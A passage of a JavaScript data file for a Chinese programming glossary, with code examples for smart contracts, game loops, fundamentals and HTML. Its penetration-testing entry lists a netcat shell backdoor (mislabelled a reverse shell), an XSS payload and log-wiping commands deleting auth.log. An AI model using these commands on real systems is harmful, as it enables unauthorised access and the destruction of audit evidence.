
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(to != address(0), "Invalid address");

        balances[msg.sender] -= amount;
        balances[to] += amount;

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balances[from] >= amount, "Insufficient balance");
        require(allowances[from][msg.sender] >= amount, "Insufficient allowance");
        require(to != address(0), "Invalid address");

        balances[from] -= amount;
        balances[to] += amount;
        allowances[from][msg.sender] -= amount;

        emit Transfer(from, to, amount);
        return true;
    }
}`,
      useCases: ['去中心化金融', '数字资产', '自动化执行', '信任机制'],
      relatedTerms: ['ethereum', 'solidity', 'gas', 'dapp']
    }
  ],

  // 游戏开发 (12个术语)
  gamedev: [
    {
      id: 'game_1',
      name: 'game_loop',
      chinese: '游戏循环',
      description: '游戏引擎的核心，持续更新游戏状态和渲染画面的循环结构',
      difficulty: 'intermediate',
      tags: ['game-engine', 'rendering', 'update'],
      example: `// 基本游戏循环结构
class GameEngine {
    constructor() {
        this.isRunning = false;
        this.lastTime = 0;
        this.targetFPS = 60;
        this.frameTime = 1000 / this.targetFPS;
    }

    start() {
        this.isRunning = true;
        this.lastTime = performance.now();
        this.gameLoop();
    }

    gameLoop = (currentTime) => {
        if (!this.isRunning) return;

        const deltaTime = currentTime - this.lastTime;

        if (deltaTime >= this.frameTime) {
            // 处理输入
            this.handleInput();

            // 更新游戏逻辑
            this.update(deltaTime);

            // 渲染画面
            this.render();

            this.lastTime = currentTime;
        }

        requestAnimationFrame(this.gameLoop);
    }

    handleInput() {
        // 处理键盘、鼠标输入
    }

    update(deltaTime) {
        // 更新游戏对象位置、状态
        // 碰撞检测
        // 物理模拟
    }

    render() {
        // 清除画布
        // 绘制游戏对象
        // 更新UI
    }

    stop() {
        this.isRunning = false;
    }
}`,
      useCases: ['游戏引擎', '实时渲染', '物理模拟', '交互系统'],
      relatedTerms: ['fps', 'delta time', 'rendering', 'physics']
    }
  ],

  // 网络安全 (18个术语)
  cybersecurity: [
    {
      id: 'cyber_1',
      name: 'penetration_testing',
      chinese: '渗透测试',
      description: '模拟黑客攻击来评估系统安全性的测试方法',
      difficulty: 'advanced',
      tags: ['security', 'testing', 'vulnerability'],
      example: `# 渗透测试基本流程

# 1. 信息收集
nmap -sS -O target_ip  # 端口扫描
whois target_domain    # 域名信息
dig target_domain      # DNS信息

# 2. 漏洞扫描
nessus_scan target_ip  # 自动化漏洞扫描
nikto -h target_url    # Web应用扫描

# 3. 漏洞利用
# SQL注入测试
sqlmap -u "http://target.com/page?id=1" --dbs

# XSS测试
<script>alert('XSS')</script>

# 4. 权限提升
# Linux权限提升
sudo -l                # 检查sudo权限
find / -perm -4000 2>/dev/null  # 查找SUID文件

# 5. 持久化访问
# 创建后门
nc -l -p 4444 -e /bin/bash  # 反向shell

# 6. 清理痕迹
history -c             # 清除命令历史
rm /var/log/auth.log   # 删除日志文件`,
      useCases: ['安全评估', '漏洞发现', '合规检查', '安全培训'],
      relatedTerms: ['vulnerability assessment', 'ethical hacking', 'security audit', 'red team']
    }
  ],

  // 基础概念 (50个术语)
  fundamentals: [
    {
      id: 'fund_1',
      name: 'algorithm',
      chinese: '算法',
      description: '解决特定问题的一系列步骤、指令或规则',
      difficulty: 'beginner',
      tags: ['algorithm', 'problem-solving', 'logic'],
      example: `// 冒泡排序算法
function bubbleSort(arr) {
    const n = arr.length;

    for (let i = 0; i < n - 1; i++) {
        for (let j = 0; j < n - i - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                // 交换元素
                [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
            }
        }
    }

    return arr;
}

// 二分查找算法
function binarySearch(arr, target) {
    let left = 0;
    let right = arr.length - 1;

    while (left <= right) {
        const mid = Math.floor((left + right) / 2);

        if (arr[mid] === target) {
            return mid;
        } else if (arr[mid] < target) {
            left = mid + 1;
        } else {
            right = mid - 1;
        }
    }

    return -1; // 未找到
}

// 递归算法示例：斐波那契数列
function fibonacci(n) {
    if (n <= 1) return n;
    return fibonacci(n - 1) + fibonacci(n - 2);
}

// 优化版本：动态规划
function fibonacciDP(n) {
    if (n <= 1) return n;

    const dp = [0, 1];
    for (let i = 2; i <= n; i++) {
        dp[i] = dp[i - 1] + dp[i - 2];
    }

    return dp[n];
}`,
      useCases: ['问题解决', '程序设计', '数据处理', '优化计算'],
      relatedTerms: ['data structures', 'complexity', 'optimization', 'recursion']
    },
    {
      id: 'fund_2',
      name: 'variable',
      chinese: '变量',
      description: '程序中用于存储数据的命名容器，其值可以在程序执行过程中改变',
      difficulty: 'beginner',
      tags: ['variables', 'data', 'programming'],
      example: `// JavaScript变量声明
let name = "Alice";           // 字符串变量
let age = 25;                 // 数字变量
let isActive = true;          // 布尔变量
let hobbies = ["reading", "coding"]; // 数组变量

// 变量重新赋值
name = "Bob";
age = 30;

// 常量（不可改变）
const PI = 3.14159;
const MAX_USERS = 100;

// Python变量示例
# 动态类型
x = 10        # 整数
x = "hello"   # 字符串
x = [1,2,3]   # 列表

# 多重赋值
a, b, c = 1, 2, 3
x, y = y, x   # 交换变量

// Java变量示例
int number = 42;
String text = "Hello World";
boolean flag = true;
double price = 19.99;

// 变量作用域
function example() {
    let localVar = "局部变量";

    if (true) {
        let blockVar = "块级变量";
        console.log(localVar);  // 可访问
        console.log(blockVar);  // 可访问
    }

    // console.log(blockVar); // 错误：超出作用域
}

let globalVar = "全局变量"; // 全局作用域`,
      useCases: ['数据存储', '状态管理', '计算处理', '程序控制'],
      relatedTerms: ['data types', 'scope', 'constants', 'assignment']
    },
    {
      id: 'fund_3',
      name: 'function',
      chinese: '函数',
      description: '可重用的代码块，接受输入参数并返回输出结果，是程序模块化的基础',
      difficulty: 'beginner',
      tags: ['functions', 'modular', 'reusable'],
      example: `// JavaScript函数定义
function greet(name) {
    return "Hello, " + name + "!";
}

// 函数调用
let message = greet("Alice");
console.log(message); // "Hello, Alice!"

// 箭头函数
const add = (a, b) => a + b;
console.log(add(5, 3)); // 8

// 函数表达式
const multiply = function(x, y) {
    return x * y;
};

// 高阶函数
function createMultiplier(factor) {
    return function(number) {
        return number * factor;
    };
}

const double = createMultiplier(2);
console.log(double(5)); // 10

// Python函数
def calculate_area(length, width):
    """计算矩形面积"""
    return length * width

area = calculate_area(10, 5)
print(f"面积: {area}")

# 默认参数
def greet_user(name, greeting="Hello"):
    return f"{greeting}, {name}!"

print(greet_user("Bob"))           # "Hello, Bob!"
print(greet_user("Alice", "Hi"))   # "Hi, Alice!"

# 可变参数
def sum_numbers(*args):
    return sum(args)

print(sum_numbers(1, 2, 3, 4))  # 10

// Java方法
public class Calculator {
    public static int add(int a, int b) {
        return a + b;
    }

    public static double calculateCircleArea(double radius) {
        return Math.PI * radius * radius;
    }
}`,
      useCases: ['代码复用', '模块化编程', '逻辑封装', '参数化操作'],
      relatedTerms: ['parameters', 'return value', 'scope', 'recursion']
    },
    {
      id: 'fund_4',
      name: 'loop',
      chinese: '循环',
      description: '重复执行代码块的控制结构，直到满足特定条件为止',
      difficulty: 'beginner',
      tags: ['control-flow', 'iteration', 'repetition'],
      example: `// for循环
for (let i = 0; i < 5; i++) {
    console.log("计数: " + i);
}

// while循环
let count = 0;
while (count < 3) {
    console.log("While循环: " + count);
    count++;
}

// do-while循环
let num = 0;
do {
    console.log("Do-while: " + num);
    num++;
} while (num < 2);

// 遍历数组
const fruits = ["apple", "banana", "orange"];

// for...of循环
for (const fruit of fruits) {
    console.log(fruit);
}

// forEach方法
fruits.forEach((fruit, index) => {
    console.log(\`\${index}: \${fruit}\`);
});

// Python循环
# for循环
for i in range(5):
    print(f"计数: {i}")

# while循环
count = 0
while count < 3:
    print(f"While循环: {count}")
    count += 1

# 遍历列表
fruits = ["apple", "banana", "orange"]
for fruit in fruits:
    print(fruit)

# 带索引的遍历
for index, fruit in enumerate(fruits):
    print(f"{index}: {fruit}")

// Java循环
// 传统for循环
for (int i = 0; i < 5; i++) {
    System.out.println("计数: " + i);
}

// 增强for循环
String[] fruits = {"apple", "banana", "orange"};
for (String fruit : fruits) {
    System.out.println(fruit);
}

// while循环
int count = 0;
while (count < 3) {
    System.out.println("While循环: " + count);
    count++;
}`,
      useCases: ['重复操作', '数据遍历', '计数器', '条件重复'],
      relatedTerms: ['iteration', 'break', 'continue', 'nested loops']
    },
    {
      id: 'fund_5',
      name: 'conditional',
      chinese: '条件语句',
      description: '根据条件的真假来决定程序执行路径的控制结构',
      difficulty: 'beginner',
      tags: ['control-flow', 'decision', 'branching'],
      example: `// if-else语句
let score = 85;

if (score >= 90) {
    console.log("优秀");
} else if (score >= 80) {
    console.log("良好");
} else if (score >= 70) {
    console.log("中等");
} else {
    console.log("需要努力");
}

// 三元运算符
const result = score >= 60 ? "及格" : "不及格";
console.log(result);

// switch语句
const day = "Monday";
switch (day) {
    case "Monday":
        console.log("星期一");
        break;
    case "Tuesday":
        console.log("星期二");
        break;
    case "Wednesday":
        console.log("星期三");
        break;
    default:
        console.log("其他日子");
}

// 逻辑运算符
const age = 25;
const hasLicense = true;

if (age >= 18 && hasLicense) {
    console.log("可以开车");
}

if (age < 18 || !hasLicense) {
    console.log("不能开车");
}

// Python条件语句
score = 85

if score >= 90:
    print("优秀")
elif score >= 80:
    print("良好")
elif score >= 70:
    print("中等")
else:
    print("需要努力")

# 简化的条件表达式
result = "及格" if score >= 60 else "不及格"
print(result)

# 多条件判断
age = 25
has_license = True

if age >= 18 and has_license:
    print("可以开车")

// Java条件语句
int score = 85;

if (score >= 90) {
    System.out.println("优秀");
} else if (score >= 80) {
    System.out.println("良好");
} else if (score >= 70) {
    System.out.println("中等");
} else {
    System.out.println("需要努力");
}

// switch表达式 (Java 14+)
String grade = switch (score / 10) {
    case 10, 9 -> "优秀";
    case 8 -> "良好";
    case 7 -> "中等";
    default -> "需要努力";
};`,
      useCases: ['决策逻辑', '分支控制', '条件执行', '程序流程'],
      relatedTerms: ['boolean', 'comparison', 'logical operators', 'branching']
    },
    {
      id: 'fund_6',
      name: 'data_types',
      chinese: '数据类型',
      description: '编程语言中用于分类数据的系统，定义了数据的存储方式和可执行的操作',
      difficulty: 'beginner',
      tags: ['data-types', 'variables', 'memory'],
      example: `// JavaScript数据类型
// 原始数据类型
let number = 42;                    // 数字
let string = "Hello World";         // 字符串
let boolean = true;                 // 布尔值
let undefined_var;                  // undefined
let null_var = null;                // null
let symbol = Symbol('id');          // Symbol (ES6)
let bigint = 123456789012345678901234567890n; // BigInt

// 复合数据类型
let object = { name: "Alice", age: 25 };
let array = [1, 2, 3, 4, 5];
let function_type = function() { return "Hello"; };

// 类型检查
console.log(typeof number);         // "number"
console.log(typeof string);         // "string"
console.log(typeof boolean);        // "boolean"
console.log(typeof undefined_var);  // "undefined"
console.log(typeof null_var);       // "object" (JavaScript的历史bug)
console.log(typeof symbol);         // "symbol"
console.log(typeof bigint);         // "bigint"
console.log(typeof object);         // "object"
console.log(typeof array);          // "object"
console.log(typeof function_type);  // "function"

// 更精确的类型检查
console.log(Array.isArray(array));  // true
console.log(object instanceof Object); // true

// Python数据类型
# 数字类型
integer = 42                # int
float_num = 3.14           # float
complex_num = 3 + 4j       # complex

# 字符串
string = "Hello World"
multiline = """
这是一个
多行字符串
"""

# 布尔值
boolean = True

# 集合类型
list_type = [1, 2, 3, 4]
tuple_type = (1, 2, 3, 4)
set_type = {1, 2, 3, 4}
dict_type = {"name": "Alice", "age": 25}

# 类型检查
print(type(integer))        # <class 'int'>
print(type(float_num))      # <class 'float'>
print(type(string))         # <class 'str'>
print(type(list_type))      # <class 'list'>

print(isinstance(integer, int))     # True
print(isinstance(string, str))      # True

// Java数据类型
// 基本数据类型
byte byteVar = 127;
short shortVar = 32767;
int intVar = 2147483647;
long longVar = 9223372036854775807L;
float floatVar = 3.14f;
double doubleVar = 3.14159265359;
char charVar = 'A';
boolean boolVar = true;

// 引用数据类型
String stringVar = "Hello World";
int[] arrayVar = {1, 2, 3, 4, 5};
List<Integer> listVar = Arrays.asList(1, 2, 3, 4, 5);

// 包装类
Integer integerWrapper = 42;
Double doubleWrapper = 3.14;
Boolean booleanWrapper = true;

// 类型转换
int num = 42;
String numStr = String.valueOf(num);        // int to String
int parsedNum = Integer.parseInt("123");    // String to int
double doubleNum = (double) num;            // int to double

// C++数据类型
/*
// 基本类型
int integer = 42;
float floatNum = 3.14f;
double doubleNum = 3.14159;
char character = 'A';
bool boolean = true;

// 指针和引用
int* pointer = &integer;
int& reference = integer;

// 数组
int array[5] = {1, 2, 3, 4, 5};

// 字符串
std::string str = "Hello World";

// 容器
std::vector<int> vector = {1, 2, 3, 4, 5};
std::map<std::string, int> map = {{"Alice", 25}, {"Bob", 30}};
*/`,
      useCases: ['变量声明', '内存管理', '类型安全', '数据处理'],
      relatedTerms: ['variables', 'memory', 'type checking', 'casting']
    },
    {
      id: 'fund_7',
      name: 'operators',
      chinese: '运算符',
      description: '用于执行特定数学或逻辑操作的符号，包括算术、比较、逻辑和赋值运算符',
      difficulty: 'beginner',
      tags: ['operators', 'expressions', 'logic'],
      example: `// JavaScript运算符
// 算术运算符
let a = 10, b = 3;
console.log(a + b);    // 13 (加法)
console.log(a - b);    // 7  (减法)
console.log(a * b);    // 30 (乘法)
console.log(a / b);    // 3.333... (除法)
console.log(a % b);    // 1  (取余)
console.log(a ** b);   // 1000 (幂运算)

// 赋值运算符
let x = 5;
x += 3;    // x = x + 3, 结果: 8
x -= 2;    // x = x - 2, 结果: 6
x *= 2;    // x = x * 2, 结果: 12
x /= 3;    // x = x / 3, 结果: 4
x %= 3;    // x = x % 3, 结果: 1

// 比较运算符
console.log(5 == "5");   // true  (相等，类型转换)
console.log(5 === "5");  // false (严格相等，不转换类型)
console.log(5 != "5");   // false (不等)
console.log(5 !== "5");  // true  (严格不等)
console.log(5 > 3);      // true  (大于)
console.log(5 < 3);      // false (小于)
console.log(5 >= 5);     // true  (大于等于)
console.log(5 <= 3);     // false (小于等于)

// 逻辑运算符
let p = true, q = false;
console.log(p && q);     // false (逻辑与)
console.log(p || q);     // true  (逻辑或)
console.log(!p);         // false (逻辑非)

// 短路求值
console.log(false && someFunction()); // 不会执行someFunction
console.log(true || someFunction());  // 不会执行someFunction

// 位运算符
let num1 = 5;  // 二进制: 101
let num2 = 3;  // 二进制: 011
console.log(num1 & num2);   // 1 (按位与: 001)
console.log(num1 | num2);   // 7 (按位或: 111)
console.log(num1 ^ num2);   // 6 (按位异或: 110)
console.log(~num1);         // -6 (按位非)
console.log(num1 << 1);     // 10 (左移: 1010)
console.log(num1 >> 1);     // 2 (右移: 10)

// 三元运算符
let age = 18;
let status = age >= 18 ? "成年人" : "未成年人";
console.log(status); // "成年人"

// 类型运算符
console.log(typeof 42);           // "number"
console.log([] instanceof Array); // true

// 解构赋值运算符
const [first, second] = [1, 2];
const {name, age} = {name: "Alice", age: 25};

// 扩展运算符
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5]; // [1, 2, 3, 4, 5]

// 空值合并运算符 (ES2020)
const value = null ?? "默认值"; // "默认值"

// 可选链运算符 (ES2020)
const user = { profile: { name: "Alice" } };
console.log(user?.profile?.name); // "Alice"
console.log(user?.address?.street); // undefined

// Python运算符
# 算术运算符
a, b = 10, 3
print(a + b)    # 13
print(a - b)    # 7
print(a * b)    # 30
print(a / b)    # 3.333...
print(a // b)   # 3 (整除)
print(a % b)    # 1
print(a ** b)   # 1000

# 比较运算符
print(5 == 5)   # True
print(5 != 3)   # True
print(5 > 3)    # True
print(5 < 3)    # False

# 逻辑运算符
print(True and False)  # False
print(True or False)   # True
print(not True)        # False

# 成员运算符
print(1 in [1, 2, 3])      # True
print(4 not in [1, 2, 3])  # True

# 身份运算符
a = [1, 2, 3]
b = a
c = [1, 2, 3]
print(a is b)      # True
print(a is c)      # False
print(a == c)      # True

# 海象运算符 (Python 3.8+)
if (n := len([1, 2, 3, 4])) > 3:
    print(f"列表长度为 {n}")`,
      useCases: ['数学计算', '逻辑判断', '数据操作', '条件控制'],
      relatedTerms: ['expressions', 'precedence', 'associativity', 'evaluation']
    },
    {
      id: 'fund_8',
      name: 'scope',
      chinese: '作用域',
      description: '变量和函数在程序中可被访问的范围，决定了标识符的可见性和生命周期',
      difficulty: 'intermediate',
      tags: ['scope', 'variables', 'functions'],
      example: `// JavaScript作用域
// 全局作用域
var globalVar = "我是全局变量";
let globalLet = "我也是全局变量";
const globalConst = "我还是全局变量";

function outerFunction() {
    // 函数作用域
    var functionVar = "我是函数作用域变量";
    let functionLet = "我也是函数作用域变量";

    console.log(globalVar);    // 可以访问全局变量
    console.log(functionVar);  // 可以访问函数变量

    if (true) {
        // 块级作用域
        var blockVar = "var没有块级作用域";
        let blockLet = "let有块级作用域";
        const blockConst = "const也有块级作用域";

        console.log(functionVar);  // 可以访问外层函数变量
        console.log(blockLet);     // 可以访问块级变量
    }

    console.log(blockVar);     // 可以访问，因为var没有块级作用域
    // console.log(blockLet);  // 错误！let有块级作用域

    function innerFunction() {
        // 嵌套函数作用域
        console.log(functionVar);  // 可以访问外层函数变量
        console.log(globalVar);    // 可以访问全局变量

        var innerVar = "我是内层函数变量";
    }

    innerFunction();
    // console.log(innerVar);  // 错误！无法访问内层函数变量
}

outerFunction();

// 闭包示例
function createCounter() {
    let count = 0;  // 私有变量

    return function() {
        count++;    // 访问外层函数的变量
        return count;
    };
}

const counter1 = createCounter();
const counter2 = createCounter();

console.log(counter1()); // 1
console.log(counter1()); // 2
console.log(counter2()); // 1 (独立的作用域)

// 立即执行函数表达式 (IIFE) 创建作用域
(function() {
    var privateVar = "我是私有的";
    // 这里的变量不会污染全局作用域
})();

// console.log(privateVar); // 错误！无法访问

// ES6模块作用域
// module.js
export const moduleVar = "我是模块变量";
export function moduleFunction() {
    const localVar = "我是模块函数的局部变量";
    return localVar;
}

// Python作用域 (LEGB规则)
# L - Local (局部)
# E - Enclosing (嵌套)
# G - Global (全局)
# B - Built-in (内置)

global_var = "全局变量"

def outer_function():
    enclosing_var = "嵌套作用域变量"

    def inner_function():
        local_var = "局部变量"
        print(local_var)        # 局部
        print(enclosing_var)    # 嵌套
        print(global_var)       # 全局
        print(len([1,2,3]))     # 内置函数

    inner_function()

# global关键字
def modify_global():
    global global_var
    global_var = "修改后的全局变量"

# nonlocal关键字
def outer():
    x = 10
    def inner():
        nonlocal x
        x = 20
    inner()
    print(x)  # 20

// Java作用域
public class ScopeExample {
    // 类级别变量
    private static String classVar = "类变量";
    private String instanceVar = "实例变量";

    public void method() {
        // 方法级别变量
        String methodVar = "方法变量";

        if (true) {
            // 块级作用域
            String blockVar = "块变量";
            System.out.println(classVar);     // 可以访问
            System.out.println(instanceVar);  // 可以访问
            System.out.println(methodVar);    // 可以访问
            System.out.println(blockVar);     // 可以访问
        }

        // System.out.println(blockVar); // 错误！无法访问块变量
    }
}`,
      useCases: ['变量管理', '命名空间', '内存管理', '代码组织'],
      relatedTerms: ['closure', 'hoisting', 'lexical scope', 'namespace']
    },
    {
      id: 'fund_9',
      name: 'recursion',
      chinese: '递归',
      description: '函数调用自身的编程技术，通过将复杂问题分解为相似的子问题来解决',
      difficulty: 'intermediate',
      tags: ['recursion', 'algorithms', 'functions'],
      example: `// JavaScript递归示例
// 阶乘计算
function factorial(n) {
    // 基础情况
    if (n <= 1) {
        return 1;
    }
    // 递归情况
    return n * factorial(n - 1);
}

console.log(factorial(5)); // 120

// 斐波那契数列
function fibonacci(n) {
    if (n <= 1) {
        return n;
    }
    return fibonacci(n - 1) + fibonacci(n - 2);
}

console.log(fibonacci(10)); // 55

// 优化的斐波那契（记忆化）
function fibonacciMemo(n, memo = {}) {
    if (n in memo) {
        return memo[n];
    }
    if (n <= 1) {
        return n;
    }
    memo[n] = fibonacciMemo(n - 1, memo) + fibonacciMemo(n - 2, memo);
    return memo[n];
}

// 二叉树遍历
class TreeNode {
    constructor(val, left = null, right = null) {
        this.val = val;
        this.left = left;
        this.right = right;
    }
}

// 前序遍历
function preorderTraversal(root, result = []) {
    if (root === null) {
        return result;
    }
    result.push(root.val);
    preorderTraversal(root.left, result);
    preorderTraversal(root.right, result);
    return result;
}

// 计算树的深度
function maxDepth(root) {
    if (root === null) {
        return 0;
    }
    return 1 + Math.max(maxDepth(root.left), maxDepth(root.right));
}

// 快速排序
function quickSort(arr) {
    if (arr.length <= 1) {
        return arr;
    }

    const pivot = arr[Math.floor(arr.length / 2)];
    const left = arr.filter(x => x < pivot);
    const middle = arr.filter(x => x === pivot);
    const right = arr.filter(x => x > pivot);

    return [...quickSort(left), ...middle, ...quickSort(right)];
}

// 汉诺塔问题
function hanoi(n, from, to, aux) {
    if (n === 1) {
        console.log(\`移动盘子从 \${from} 到 \${to}\`);
        return;
    }

    hanoi(n - 1, from, aux, to);
    console.log(\`移动盘子从 \${from} 到 \${to}\`);
    hanoi(n - 1, aux, to, from);
}

// 目录遍历
function traverseDirectory(dir, depth = 0) {
    const indent = '  '.repeat(depth);
    console.log(\`\${indent}\${dir.name}\`);

    if (dir.children) {
        dir.children.forEach(child => {
            traverseDirectory(child, depth + 1);
        });
    }
}

// 尾递归优化示例
function factorialTail(n, acc = 1) {
    if (n <= 1) {
        return acc;
    }
    return factorialTail(n - 1, n * acc);
}

// Python递归示例
def gcd(a, b):
    """最大公约数"""
    if b == 0:
        return a
    return gcd(b, a % b)

def power(base, exp):
    """幂运算"""
    if exp == 0:
        return 1
    if exp == 1:
        return base

    if exp % 2 == 0:
        half = power(base, exp // 2)
        return half * half
    else:
        return base * power(base, exp - 1)

def reverse_string(s):
    """反转字符串"""
    if len(s) <= 1:
        return s
    return s[-1] + reverse_string(s[:-1])

# 递归生成器
def countdown(n):
    if n > 0:
        yield n
        yield from countdown(n - 1)

# 使用示例
for num in countdown(5):
    print(num)  # 5, 4, 3, 2, 1

// 递归的注意事项
// 1. 必须有基础情况（终止条件）
// 2. 递归调用必须向基础情况靠近
// 3. 注意栈溢出问题
// 4. 考虑是否可以用迭代替代

// 将递归转换为迭代
function factorialIterative(n) {
    let result = 1;
    for (let i = 2; i <= n; i++) {
        result *= i;
    }
    return result;
}

function fibonacciIterative(n) {
    if (n <= 1) return n;

    let a = 0, b = 1;
    for (let i = 2; i <= n; i++) {
        [a, b] = [b, a + b];
    }
    return b;
}`,
      useCases: ['树遍历', '分治算法', '数学计算', '数据结构操作'],
      relatedTerms: ['base case', 'stack overflow', 'tail recursion', 'memoization']
    },
    {
      id: 'fund_10',
      name: 'object_oriented_programming',
      chinese: '面向对象编程',
      description: '基于对象概念的编程范式，通过封装、继承和多态来组织代码',
      difficulty: 'intermediate',
      tags: ['oop', 'classes', 'objects'],
      example: `// JavaScript面向对象编程
// ES6类语法
class Animal {
    constructor(name, species) {
        this.name = name;
        this.species = species;
    }

    // 方法
    speak() {
        console.log(\`\${this.name} makes a sound\`);
    }

    // 静态方法
    static getKingdom() {
        return "Animalia";
    }

    // Getter
    get info() {
        return \`\${this.name} is a \${this.species}\`;
    }

    // Setter
    set nickname(value) {
        this._nickname = value;
    }

    get nickname() {
        return this._nickname || this.name;
    }
}

// 继承
class Dog extends Animal {
    constructor(name, breed) {
        super(name, "Dog");  // 调用父类构造函数
        this.breed = breed;
    }

    // 方法重写
    speak() {
        console.log(\`\${this.name} barks: Woof!\`);
    }

    // 新方法
    fetch() {
        console.log(\`\${this.name} fetches the ball\`);
    }
}

class Cat extends Animal {
    constructor(name, breed) {
        super(name, "Cat");
        this.breed = breed;
    }

    speak() {
        console.log(\`\${this.name} meows: Meow!\`);
    }

    climb() {
        console.log(\`\${this.name} climbs the tree\`);
    }
}

// 使用示例
const dog = new Dog("Buddy", "Golden Retriever");
const cat = new Cat("Whiskers", "Persian");

dog.speak();    // Buddy barks: Woof!
cat.speak();    // Whiskers meows: Meow!
dog.fetch();    // Buddy fetches the ball
cat.climb();    // Whiskers climbs the tree

console.log(dog.info);  // Buddy is a Dog
console.log(Animal.getKingdom()); // Animalia

// 多态示例
function makeAnimalSpeak(animal) {
    animal.speak();  // 不同的动物会有不同的行为
}

makeAnimalSpeak(dog);  // Buddy barks: Woof!
makeAnimalSpeak(cat);  // Whiskers meows: Meow!

// 原型链继承（ES5风格）
function Vehicle(make, model) {
    this.make = make;
    this.model = model;
}

Vehicle.prototype.start = function() {
    console.log(\`\${this.make} \${this.model} is starting\`);
};

function Car(make, model, doors) {
    Vehicle.call(this, make, model);  // 调用父构造函数
    this.doors = doors;
}

// 设置原型链
Car.prototype = Object.create(Vehicle.prototype);
Car.prototype.constructor = Car;

Car.prototype.honk = function() {
    console.log("Beep beep!");
};

const myCar = new Car("Toyota", "Camry", 4);
myCar.start();  // Toyota Camry is starting
myCar.honk();   // Beep beep!

// Python面向对象编程
class BankAccount:
    # 类变量
    bank_name = "Python Bank"

    def __init__(self, account_number, owner, balance=0):
        # 实例变量
        self.account_number = account_number
        self.owner = owner
        self._balance = balance  # 受保护的属性
        self.__pin = None       # 私有属性

    # 实例方法
    def deposit(self, amount):
        if amount > 0:
            self._balance += amount
            return True
        return False

    def withdraw(self, amount):
        if 0 < amount <= self._balance:
            self._balance -= amount
            return True
        return False

    # 属性装饰器
    @property
    def balance(self):
        return self._balance

    @balance.setter
    def balance(self, value):
        if value >= 0:
            self._balance = value

    # 类方法
    @classmethod
    def get_bank_name(cls):
        return cls.bank_name

    # 静态方法
    @staticmethod
    def validate_account_number(account_number):
        return len(account_number) == 10

    # 特殊方法（魔术方法）
    def __str__(self):
        return f"Account {self.account_number}: {self.owner}"

    def __repr__(self):
        return f"BankAccount('{self.account_number}', '{self.owner}', {self._balance})"

# 继承
class SavingsAccount(BankAccount):
    def __init__(self, account_number, owner, balance=0, interest_rate=0.02):
        super().__init__(account_number, owner, balance)
        self.interest_rate = interest_rate

    def add_interest(self):
        interest = self._balance * self.interest_rate
        self.deposit(interest)
        return interest

# 多重继承
class Timestamped:
    def __init__(self):
        from datetime import datetime
        self.created_at = datetime.now()

class TimestampedSavingsAccount(SavingsAccount, Timestamped):
    def __init__(self, account_number, owner, balance=0, interest_rate=0.02):
        SavingsAccount.__init__(self, account_number, owner, balance, interest_rate)
        Timestamped.__init__(self)

// Java面向对象编程
/*
// 抽象类
abstract class Shape {
    protected String color;

    public Shape(String color) {
        this.color = color;
    }

    // 抽象方法
    public abstract double getArea();

    // 具体方法
    public String getColor() {
        return color;
    }
}

// 接口
interface Drawable {
    void draw();
    default void print() {
        System.out.println("Printing shape");
    }
}

// 实现类
public class Circle extends Shape implements Drawable {
    private double radius;

    public Circle(String color, double radius) {
        super(color);
        this.radius = radius;
    }

    @Override
    public double getArea() {
        return Math.PI * radius * radius;
    }

    @Override
    public void draw() {
        System.out.println("Drawing a " + color + " circle");
    }

    // 方法重载
    public void setRadius(double radius) {
        this.radius = radius;
    }

    public void setRadius(int radius) {
        this.radius = (double) radius;
    }
}

// 泛型类
public class Box<T> {
    private T content;

    public void set(T content) {
        this.content = content;
    }

    public T get() {
        return content;
    }
}
*/

// 设计模式示例
// 单例模式
class Singleton {
    constructor() {
        if (Singleton.instance) {
            return Singleton.instance;
        }
        Singleton.instance = this;
        return this;
    }

    static getInstance() {
        if (!Singleton.instance) {
            Singleton.instance = new Singleton();
        }
        return Singleton.instance;
    }
}

// 工厂模式
class AnimalFactory {
    static createAnimal(type, name) {
        switch (type) {
            case 'dog':
                return new Dog(name, 'Mixed');
            case 'cat':
                return new Cat(name, 'Mixed');
            default:
                throw new Error('Unknown animal type');
        }
    }
}

const factoryDog = AnimalFactory.createAnimal('dog', 'Factory Dog');
const factoryCat = AnimalFactory.createAnimal('cat', 'Factory Cat');`,
      useCases: ['代码组织', '代码复用', '模块化设计', '大型项目开发'],
      relatedTerms: ['encapsulation', 'inheritance', 'polymorphism', 'abstraction']
    }
  ],

  // HTML基础 (15个术语)
  html: [
    {
      id: 'html_1',
      name: 'html',
      chinese: 'HTML',
      description: '超文本标记语言，用于创建网页结构和内容的标准标记语言',
      difficulty: 'beginner',
      tags: ['html', 'markup', 'web'],
      example: `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="这是一个示例网页">
    <meta name="keywords" content="HTML, 网页, 示例">
    <title>我的第一个网页</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
    <!-- 页面头部 -->
    <header>
        <nav>
            <ul>
                <li><a href="#home">首页</a></li>
                <li><a href="#about">关于</a></li>
                <li><a href="#contact">联系</a></li>
            </ul>
        </nav>
    </header>

    <!-- 主要内容 -->
    <main>
        <section id="home">
            <h1>欢迎来到我的网站</h1>
            <p>这是一个使用HTML创建的简单网页。</p>

            <!-- 图片 -->
            <img src="example.jpg" alt="示例图片" width="300" height="200">

            <!-- 列表 -->
            <h2>我的技能</h2>
            <ul>
                <li>HTML</li>
                <li>CSS</li>
                <li>JavaScript</li>
            </ul>

            <!-- 有序列表 -->
            <h2>学习步骤</h2>
            <ol>
                <li>学习HTML基础</li>
                <li>掌握CSS样式</li>
                <li>学习JavaScript编程</li>
            </ol>
        </section>

        <section id="about">
            <h2>关于我</h2>
            <p>我是一名<strong>前端开发者</strong>，热爱<em>编程</em>。</p>

            <!-- 表格 -->
            <table border="1">
                <thead>
                    <tr>
                        <th>技能</th>
                        <th>熟练度</th>
                        <th>经验年限</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>HTML</td>
                        <td>高级</td>
                        <td>3年</td>
                    </tr>
                    <tr>
